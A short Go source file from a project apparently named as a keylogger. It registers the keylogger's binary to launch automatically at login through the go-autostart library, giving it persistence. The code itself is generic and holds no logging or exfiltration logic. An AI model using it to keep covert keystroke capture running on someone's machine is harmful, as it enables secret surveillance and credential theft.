package autostart

import (
	"fmt"

	"github.com/Tom5521/keylogger/internal/cfgs"
	"github.com/emersion/go-autostart"
)

func Make() *autostart.App {
	return &autostart.App{
		Name:        cfgs.Settings.Name,
		DisplayName: cfgs.Settings.Name,
		Exec:        []string{cfgs.Settings.BinDir},
	}
}

func Check(app *autostart.App) bool {
	return app.IsEnabled()
}

func Set(app *autostart.App) {
	err := app.Enable()
	if err != nil {
		fmt.Println(err)
	}
}
